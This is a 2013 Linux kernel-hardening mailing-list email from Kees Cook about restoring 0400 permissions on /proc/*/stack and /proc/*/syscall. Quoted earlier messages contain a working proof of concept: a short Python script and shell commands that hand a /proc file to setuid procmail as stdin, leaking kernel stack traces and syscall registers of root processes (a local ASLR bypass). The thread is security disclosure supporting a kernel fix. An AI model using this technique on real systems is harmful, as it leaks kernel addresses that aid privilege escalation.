Reply-To: kernel-hardening@lists.openwall.com
MIME-Version: 1.0
Sender: keescook@google.com
In-Reply-To: <CAGXu5jJ2yop1JrJT1nzKWoT_Q83s9fGK_2BuBcCotHCR9YecDQ@mail.gmail.com>
References: <1377534240-13227-1-git-send-email-tixxdz@opendz.org>
	<871u5gqtw3.fsf@xmission.com>
	<20130826172054.GE27005@ZenIV.linux.org.uk>
	<20130827172406.GA2664@dztty>
	<20130828201141.GA21455@dztty>
	<CAGXu5jJ2yop1JrJT1nzKWoT_Q83s9fGK_2BuBcCotHCR9YecDQ@mail.gmail.com>
Date: Thu, 3 Oct 2013 17:41:37 -0700
Message-ID: <CAGXu5jLSXO_MzLtEn_9gdiWmEru+=o1ZnZ8z-m=KZy37Ry4NDQ@mail.gmail.com>
From: Kees Cook <keescook@chromium.org>
Content-Type: text/plain; charset=ISO-8859-1
Subject: [kernel-hardening] Re: [PATCH 1/2] procfs: restore 0400 permissions on /proc/*/{syscall,stack,personality}
To: Djalal Harouni <tixxdz@opendz.org>
Cc: Al Viro <viro@zeniv.linux.org.uk>, "Eric W. Biederman" <ebiederm@xmission.com>, Andrew Morton <akpm@linux-foundation.org>, Solar Designer <solar@openwall.com>, Vasiliy Kulikov <segoon@openwall.com>, Linus Torvalds <torvalds@linux-foundation.org>, Ingo Molnar <mingo@kernel.org>, LKML <linux-kernel@vger.kernel.org>, "kernel-hardening@lists.openwall.com" <kernel-hardening@lists.openwall.com>, Ryan Mallon <rmallon@gmail.com>, George Spelvin <linux@horizon.com>
List-ID: <kernel-hardening.lists.openwall.com>

On Wed, Aug 28, 2013 at 1:49 PM, Kees Cook <keescook@chromium.org> wrote:
> On Wed, Aug 28, 2013 at 1:11 PM, Djalal Harouni <tixxdz@opendz.org> wrote:
>> Cc'ed more people,
>>
>> On Tue, Aug 27, 2013 at 06:24:06PM +0100, Djalal Harouni wrote:
>>> Hi Al,
>>>
>>> On Mon, Aug 26, 2013 at 06:20:55PM +0100, Al Viro wrote:
>>> > On Mon, Aug 26, 2013 at 09:49:48AM -0700, Eric W. Biederman wrote:
>>> >
>>> > > How does changing the permissions to S_IRUSR prevent someone from
>>> > > opening the file before, and reading the file after a suid exec?
>>> > >
>>> > > > This patch restores the old mode which was 0400
>>> > >
>>> > > Which seems to add no security whatsoever and obscure the fact that
>>> > > anyone who cares can read the file so what is the point?
>>> >
>>> > Two words: "security sclerosis".  Both patches NAKed, of course.
>>> These particular tissues "are being hardened", no cure for them
>>>
>>>
>>> More seriously, Al your commit a9712bc12c40c172e393f85 closes the races
>>> during read() ok, but can you please share some light why the permission
>>> mode was changed ?
>>>
>>> 1)
>>> The commit log states that all these files are "rw-r--r--" which was not
>>> correct, they were "r--------" before that commit.
>>>
>>> 2)
>>> The commit log says also:
>>> "if you open a file before the target does suid-root exec, you'll be still
>>> able to access it." so you do the task is tracable check at read()
>>>
>>> But what if you open a file of a privileged target or a target that does
>>> suid-root exec later, and pass the fd to a suid-root exec to read() from
>>> it later, you will still pass that tracable check.
>>>
>>> And currently a non-privileged process can get an fd on all these
>>> /proc/*/stack files even root owned ones.
>>>
>>> So why not restore the old behaviour and block a process from getting an
>>> fd on /proc/*/stack files that belong to other processes?
>>>
>>>
>>> The original thread that added the /proc/*/stack feature:
>>> https://lkml.org/lkml/2008/11/7/109
>>>
>>> They noted that it should be under 0400 permissions
>
> Yes, this was discussed years ago -- these files must be 0400 _and_
> perform at-read checks.
>
> https://lkml.org/lkml/2011/2/10/21
>
> This is all related to
> http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-1020
>
> Which had the following fixes, but broken file access perms in several places:
>
> http://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/?id=a9712bc12c40c172e393f85a9b2ba8db4bf59509
> http://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/?id=2fadaef41283aad7100fa73f01998cddaca25833
> http://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/?id=d6f64b89d7ff22ce05896ab4a93a653e8d0b123d
> http://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/?id=ec6fd8a4355cda81cd9f06bebc048e83eb514ac7
> http://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/?id=ca6b0bf0e086513b9ee5efc0aa5770ecb57778af
>
> So instead of needing to survive exec, now the file can just be passed as stdin.
>
>>>
>>> So why remove that, or why not restore the old safe behaviour ?
>>>
>>>
>>> Hope to get a response
>>>
>>> Thanks Al
>>
>> Hope this will convince.
>>
>> Please not I'm just trying to help/contribute and get things right.
>> If there is something obvious that I'm missing let me know, will
>> be happy to learn
>>
>>
>> tixxdz@dztty-qemu:~$ id
>> uid=1000(tixxdz) gid=1000(tixxdz)
>> groups=1000(tixxdz),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev)
>>
>> tixxdz@dztty-qemu:~$ ls -lha ./a.out
>> -rwxr-xr-x 1 tixxdz tixxdz 8.0K Aug 28 20:26 ./a.out
>>
>> tixxdz@dztty-qemu:~$ ls -lha /usr/bin/procmail
>> -rwsr-sr-x 1 root mail 88K Apr 25  2010 /usr/bin/procmail
>>
>> (procmail with -d needs setuid())
>>
>> tixxdz@dztty-qemu:~$ for i in $(seq 1 10); do ./a.out /usr/bin/procmail
>> /proc/$i/stack ; done
>
> Can you include your C file for your a.out? I assume you're opening
> /proc/$i/stack and duping to stdin for a "procmail -d tixxdz" call,
> and I can reproduce this with the following python, but I want to be
> sure I'm seeing the same bug.
>
> #!/usr/bin/python
> import sys
> from subprocess import call
> call(["/usr/bin/procmail", "-d", sys.argv[2]], stdin=open(sys.argv[1]))
>
>
> $ ps -ef | grep apache2 | grep root
> root      3781     1  0 Jul28 ?        00:00:37 /usr/sbin/apache2 -k start
> $ cat /proc/3781/stack
> cat: /proc/3781/stack: Operation not permitted
> $ /tmp/dup-stdin.py /proc/3781/syscall kees
> $ cat /var/mail/kees
> 23 0x0 0x0 0x0 0x0 0x7fffa29c9cf0 0x1 0x7fffa29c9d18 0x7f1b76bbd233
>
> So, local ASLR bypass using a setuid helper.
>
> One shouldn't be able to open these files in the first place.

BTW, this just came to my attention:
http://marc.info/?l=linux-kernel&m=138049414321387&w=2

Same problem, just for /proc/kallsyms. This would benefit from the
open vs read cred check as well, I think.

-Kees

>
> -Kees
>
>>
>> tixxdz@dztty-qemu:~$ cat /var/mail/tixxdz
>> [<ffffffff811b6537>] poll_schedule_timeout+0x57/0xe0
>> [<ffffffff811b70c7>] do_select+0x8b7/0x9a0
>> [<ffffffff811b766c>] core_sys_select+0x4bc/0x4f0
>> [<ffffffff811b7761>] SyS_select+0xc1/0x110
>> [<ffffffff81aef5e9>] system_call_fastpath+0x16/0x1b
>> [<ffffffffffffffff>] 0xffffffffffffffff
>>
>> [<ffffffff8108a6e1>] kthreadd+0xb1/0x150
>> [<ffffffff81aef53c>] ret_from_fork+0x7c/0xb0
>> [<ffffffffffffffff>] 0xffffffffffffffff
>>
>> [<ffffffff8109389e>] smpboot_thread_fn+0x1be/0x220
>> [<ffffffff8108a1b1>] kthread+0xd1/0xe0
>> [<ffffffff81aef53c>] ret_from_fork+0x7c/0xb0
>> [<ffffffffffffffff>] 0xffffffffffffffff
>>
>> [<ffffffff81081610>] worker_thread+0x2e0/0x370
>> [<ffffffff8108a1b1>] kthread+0xd1/0xe0
>> [<ffffffff81aef53c>] ret_from_fork+0x7c/0xb0
>> [<ffffffffffffffff>] 0xffffffffffffffff
>>
>> [<ffffffff81081610>] worker_thread+0x2e0/0x370
>> [<ffffffff8108a1b1>] kthread+0xd1/0xe0
>> [<ffffffff81aef53c>] ret_from_fork+0x7c/0xb0
>> [<ffffffffffffffff>] 0xffffffffffffffff
>>
>> [<ffffffff81081610>] worker_thread+0x2e0/0x370
>> [<ffffffff8108a1b1>] kthread+0xd1/0xe0
>> [<ffffffff81aef53c>] ret_from_fork+0x7c/0xb0
>> [<ffffffffffffffff>] 0xffffffffffffffff
>>
>> [<ffffffff8109389e>] smpboot_thread_fn+0x1be/0x220
>> [<ffffffff8108a1b1>] kthread+0xd1/0xe0
>> [<ffffffff81aef53c>] ret_from_fork+0x7c/0xb0
>> [<ffffffffffffffff>] 0xffffffffffffffff
>>
>> [<ffffffff811020f3>] rcu_gp_kthread+0xe3/0x620
>> [<ffffffff8108a1b1>] kthread+0xd1/0xe0
>> [<ffffffff81aef53c>] ret_from_fork+0x7c/0xb0
>> [<ffffffffffffffff>] 0xffffffffffffffff
>>
>> [<ffffffff811023b4>] rcu_gp_kthread+0x3a4/0x620
>> [<ffffffff8108a1b1>] kthread+0xd1/0xe0
>> [<ffffffff81aef53c>] ret_from_fork+0x7c/0xb0
>> [<ffffffffffffffff>] 0xffffffffffffffff
>>
>> [<ffffffff8109389e>] smpboot_thread_fn+0x1be/0x220
>> [<ffffffff8108a1b1>] kthread+0xd1/0xe0
>> [<ffffffff81aef53c>] ret_from_fork+0x7c/0xb0
>> [<ffffffffffffffff>] 0xffffffffffffffff
>>
>> You have mail in /var/mail/tixxdz
>>
>>
>> Thanks
>>
>> --
>> Djalal Harouni
>> http://opendz.org
>
>
>
> --
> Kees Cook
> Chrome OS Security



-- 
Kees Cook
Chrome OS Security
